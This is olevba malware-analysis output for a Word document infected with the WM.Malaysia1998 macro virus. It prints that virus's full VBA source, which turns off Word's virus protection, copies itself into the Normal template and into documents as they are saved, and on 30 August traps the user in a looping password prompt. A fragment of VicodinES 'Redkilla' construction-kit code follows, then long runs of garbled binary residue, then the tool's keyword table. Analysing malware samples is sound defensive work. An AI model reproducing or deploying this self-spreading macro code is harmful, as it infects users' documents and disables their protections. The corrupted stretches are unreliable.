olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Proteced.e-a6abcd614be668756dd5e1aac40405f03ee01516
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Proteced.e-a6abcd614be668756dd5e1aac40405f03ee01516 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Malaysia1998.bas 
in file: Virus.MSWord.Proteced.e-a6abcd614be668756dd5e1aac40405f03ee01516 - OLE stream: 'Macros/VBA/Malaysia1998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoExec()

Options.VirusProtection = False

End Sub

Sub AutoOpen()

On Error GoTo err
Options.SaveNormalPrompt = False
DocumentToNormal
NormalTemplate.Save
err:

End Sub

Sub FileOpen()

Application.EnableCancelKey = wdCancelDisabled
On Error GoTo err
   Options.VirusProtection = False
   Dialogs(wdDialogFileOpen).Show
err:
Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub FileSave()

Application.EnableCancelKey = wdCancelDisabled
Trigger
On Error GoTo err
   NormalToDocument
   ActiveDocument.Save
err:
Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Macro recorded 04/09/98 by Ng Bing Yew"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro2"

Application.EnableCancelKey = wdCancelDisabled
Trigger
On Error GoTo err
   NormalToDocument
   Dialogs(wdDialogFileSaveAs).Show
err:
Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub NormalToDocument()

On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "Malaysia1998"
   Application.OrganizerCopy Source:=global_temp, _
   Destination:=cur_doc, Name:=macroname, _
   Object:=wdOrganizerObjectProjectItems
err:

End Sub

Sub DocumentToNormal()

On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "Malaysia1998"
   Application.OrganizerCopy Source:=cur_doc, _
                             Destination:=global_temp, _
                             Name:=macroname, _
                             Object:=wdOrganizerObjectProjectItems
err:
   
End Sub

Sub Trigger()

On Error GoTo err
   Todaydate = Date
   If (Month(Todaydate) = 8) And (Day(Todaydate) = 30) Then
       Do
         cr = Chr(13) + Chr(10)
         titles = "WM.MALAYSIA 1998"
         msg1 = "You are lucky!!! You have met WM.MALAYSIA 1998!!!" + cr
         msg2 = "WM.MALAYSIA 1998 is Malaysian's first MACRO VIRUS." + cr
         msg3 = "It is written by a young college student -- BAD LOGIC." + cr
         msg4 = cr + cr + cr + cr + "Please ENTER CORRECT password: "
         msg = msg1 + msg2 + msg3 + msg4
         response = InputBox(msg, titles)
       Loop While (response <> "WM.MALAYSIA 1998")
    End If
err:

End Sub

-------------------------------------------------------------------------------
VBA MACRO 1Table 
in file: Virus.MSWord.Proteced.e-a6abcd614be668756dd5e1aac40405f03ee01516 - OLE stream: '1Table'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Redkilla()
    'The VicodinES Macro.Poppy Construction Kit v1.0c
    '====================================================
    'Code Written by VicodinES---------------------------
    
    'Poppy ID : 85888822-234 Compatable with SR-1
    'I Give You ---> Redkilla.Poppy !! Dig It !!
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
k10098 = m9800 & e14432
f11657 = u10760 & c7467 & Int(Rnd * 2848)
k8549 = m2159 & e9102
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("Redkilla").Export "c:\Redkilla.sys"
f13349 = u16025 & c18152 & Int(Rnd * 7874)
f7504 = u8393 & c2811 & Int(Rnd * 5361)
ActiveDocument.ReadOnlyRecommendeendeendeendeendeende inE ieouetRaOlRcmedneedneedne n eutalceedneenetleenntennennAttri  ÿÿÿÿ   ÿÿÿÿÿÿ                                                        ÿÿÿÿ=============
  'oeWitnb ioiE-----eWitnb ioiE-----eWitnb ioiE-----eW=======o -Yu-- eklaPpy! i t!
  
O ro eueNx
R-----
    
    'Poppy ID : 85888888Þ   _       c
I v=2Te v$="e.o"
108=m80&e43
f15  170&c47&ItRd*24)
84  25  90
Otosssssssssss rÕvÕ  ÿÿÿÿÿÿÿÿ                               ÿÿ  { Ö   Ö  [!    ÿÿ[!    ÿÿ[!    ÿÿ[!    ÿÿ[!    ÿÿ[!!!!Wtb n(!!Wtb n(!!Wtb n(!!Wtb n(!!Wtb n(!!!!!Eion eutalceedneenetleenntennennAti ÿÿ ÿÿÿ                            ÿÿ======= 'ein oE--ein oE--ein oE--e==== Y- kap!it
 Or uN
---
  
  PpyI  5888     cIv2ev=eo
0=8&4
1 10c7IR*4
4 5 0Oosssss ÕÕ ÿÿÿÿ               ÿ Ö Ö !  ÿ!  ÿ!  ÿ!  ÿ!  ÿ!!Wbn!Wbn!Wbn!Wbn!Wbn!!!inetleenntennennAiÿ ÿ              ÿ===='i E-i E-i E-== -kpi
O N-- 
 pI 88   I2ve
=&
 07R4450oss Õÿÿ        ÿ   ÿ ÿ ÿ ÿ ÿ!b!b!b!b!b!!ntennennA        ==' - - -=-p
 -  I8  2e=
0R40s ÿ    ÿ      !!!!!!nennA    =   =p  I 2=04sÿ     !!!nnA  = = I20s   !nA   2s !A 2 A2AAAttribute VB_Name = "Redkilla"
    
SbRdil(
  'h ioiE ar.op osrcinKtv.c
  ==========================
  'oeWitnb ioiE--------------
  
  PpyI  588224Cmaal ihS-
  ' ieYu-- eklaPpy! i t!
  
O ro eueNx
Rnoie
v=ItRd*3  
I v=1Te v$="on.o"
fs   hnst  ram!dc
I v=2Te v$="e.o"
108=m80&e43
f15  170&c47&ItRd*24)
84  25  90
OtosCnimovrin  as
OtosVrsrtcin=Fle
pin.aeomlrmt=Fle
plcto.B.cieBrjc.Bopnns"ekla)Epr c\eklass
f34  105&c85  n(n  84
f54=u33&c81&ItRd*56)
cieouetRaOlRcmedneedneedne n eutalceedneenetleenntennennAti ÿÿ ÿÿÿ                            ÿÿ======= 'ein oE--ein oE--ein oE--e==== Y- kap!it
 Or uN
---
  
  PpyI  5888     cIv2ev=eo
0=8&4
1 10c7IR*4
4 5 0Oosssss ÕÕ ÿÿÿÿ               ÿ Ö Ö !  ÿ!  ÿ!  ÿ!  ÿ!  ÿ!!Wbn!Wbn!Wbn!Wbn!Wbn!!!inetleenntennennAiÿ ÿ              ÿ===='i E-i E-i E-==='i E-i E-i E-======841 E-i E-==='i E-i EEEEE         ß    ÿÿ-==='i E-i EEEEE  ÿÿ        Te 105&c85= kiO- -=-p
 -  I8  2e=
0R40s ÿ    ÿ      !!!!!!nennA    ======  I 2=04sÿ     !!!!!!!!! = I20s   !nA   2s !A 2 A2AAAtiueV_an!Wbn!!!inetleXXXXvc  scnt.
 ==========ÿ   ÿÿÿÿÿÿÿÿÿÿÿÿÿ- 
 pI 824ma h- 'iY- kap!it
 Or uN
nnnnnnn Iv1ev=o."f  nt a!cIv2ev=eo
0=8&4
1 10c7IR*4
4 5 0OoCiorn sOoVsti=l
i.emrtFepcoBcercBpn"kacin=Fle
pin.aeomlrrrrrrr======  0 - 
=  0 - 
= ntÿnennAiÿ ÿ              ÿ===='i E-i E-i E-== -kpi
O N-- 
 pI 88   I2ve
=&
 0788   I2ve
=&
 0788888 ! 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

